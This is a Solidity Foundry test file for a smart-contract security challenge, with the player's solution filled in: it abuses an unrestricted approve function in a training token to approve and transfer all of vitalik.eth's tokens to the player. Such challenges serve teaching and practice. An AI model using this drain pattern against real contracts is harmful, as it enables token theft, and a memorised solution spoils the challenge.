// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {VToken} from "../src/Challenge0.VToken.sol";

contract Challenge0Test is Test {
    address token;

    address player = makeAddr("player");
    address vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;

    function setUp() public {
        
        token = address(new VToken());
        
        vm.label(token, "VToken");
        vm.label(vitalik, "vitalik.eth");
        vm.label(player, "Player");
    }

    function testChallenge() public {        
        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //============================//

        // Get balance of vitalik
        uint balance = VToken(token).balanceOf(vitalik);

        // The approve function of the VToken allows anyone to approve anything
        // So we can call approve for vitalik's tokens
        VToken(token).approve(vitalik, player, balance);
        // Then we transfer his tokens to us
        IERC20(token).transferFrom(vitalik, player, balance);


        vm.stopPrank();

        assertEq(
            IERC20(token).balanceOf(player),
            IERC20(token).totalSupply(),
            "you must get all the tokens"
        );
    }
}


/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


